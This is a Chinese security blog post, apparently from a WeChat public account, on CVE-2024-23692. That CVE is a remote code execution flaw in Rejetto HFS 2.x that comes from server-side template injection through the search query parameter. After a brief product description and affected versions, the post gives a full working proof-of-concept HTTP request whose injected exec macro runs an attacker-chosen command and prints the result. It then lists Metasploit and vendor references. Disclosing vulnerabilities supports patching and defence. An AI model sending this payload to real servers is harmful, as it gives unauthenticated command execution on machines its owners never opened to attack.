#  CVE-2024-23692｜Rejetto HFS 2.x 远程代码执行漏洞（POC）   
alicy  信安百科   2024-06-14 09:00  
  
**0x00 前言**  
  
  
HFS（HTTP File Server）是一个基于HTTP协议的文件服务器软件，允许用户通过浏览器访问和共享计算机上的文件。HFS的起源可以追溯到2002年，由Rejetto开发并发布。  
  
HFS的主要特点包括界面简洁直观、易于安装和配置、支持虚拟文件系统、支持多种权限设置等。通过HFS，用户可以轻松地在本地网络或互联网上共享文件和文件夹，无需安装额外的软件，只需使用一个支持HTTP协议的浏览器即可访问和下载文件。  
  
  
  
**0x01 漏洞描述**  
  
****  
根本原因在于服务器处理用于呈现 HTTP 响应的默认模板的方式。  
  
此模板包含来自请求的搜索查询参数的内容，该内容未正确转义，从而启用了
SSTI
在正常操作下，符号和宏会被编码以防止 SSTI。但是，通过强制服务器取消转义某些字符，攻击者可以将任意宏注入模板。  
  
  
  
**0x02 CVE编号**  
  
  
CVE-2024-23692  
  
  
  
**0x03 影响版本**  
  
  
Rejetto HFS 2.x  
  
  
  
**0x04 漏洞详情**  
  
  
POC：  
```
GET /?n=%0A&cmd=whoami&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.} HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: HFS_SID_=0.590236319694668
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Whm7t4Je6uqBWicrNFmy3gLKMzrwtbDtCBtSWYxcibvibOqwEG39gXSBjQ1BdU0FEC1ITlpFAN8A6gicnorUkbK5eQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
**0x05 参考链接**  
  
  
https://github.com/rapid7/metasploit-framework/pull/19240  
  
  
https://www.rejetto.com/hfs/?f=dl  
  
  
  
  
推荐阅读：  
  
  
[CVE-2024-21683｜Atlassian Confluence远程代码执行漏洞（POC）](http://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247485351&idx=2&sn=0adc42b4d60e706882552cdd8c61db21&chksm=cea96e7ef9dee7686226667380cede00bff25f0cfbeb37361ea7e4d10ef65d4c526ba54168f8&scene=21#wechat_redirect)  
  
  
  
[CVE-2024-27130｜QNAP 存在未经身份验证的RCE漏洞（POC）](http://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247485311&idx=1&sn=b1a169294dbb58cd7913d36bbf9f3f0c&chksm=cea96ea6f9dee7b09457245369acda315d405d226749cf4e786c10f038806cb4e660599d0e2e&scene=21#wechat_redirect)  
  
  
  
[CVE-2024-32399｜RaidenMAILD Mail Server路径遍历漏洞（POC）](http://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247485273&idx=1&sn=a82529b85eefa1d75072e8232300c89d&chksm=cea96e80f9dee79628ca2241d263499ea7ac27e121407aec485efe779f09d07842ea95f2f0c7&scene=21#wechat_redirect)  
  
  
  
  
  
Ps：国内外安全热点分享，欢迎大家分享、转载，请保证文章的完整性。文章中出现敏感信息和侵权内容，请联系作者删除信息。信息安全任重道远，感谢您的支持![](https://mmbiz.qpic.cn/mmbiz_png/Whm7t4Je6urTIficI8UhQibwpYWx4ic7Bk40AJlXrgx3icofWCbd5cbJFheld132R8exvlHnicn0AUjHLmVok4wV9qA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
！！！  
  
  
**本公众号的文章及工具仅提供学习参考，由于传播、利用此文档提供的信息而造成任何直接或间接的后果及损害，均由使用者本人负责,本公众号及文章作者不为此承担任何责任。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Whm7t4Je6uqQ24S6worK6npevNP8p1uPc9jQeMAib2iaibBnibOzFaIbD0KlvsEtUAmL3xdbJJnWk74Y1KfBcIazzw/640?wx_fmt=png "")  
  
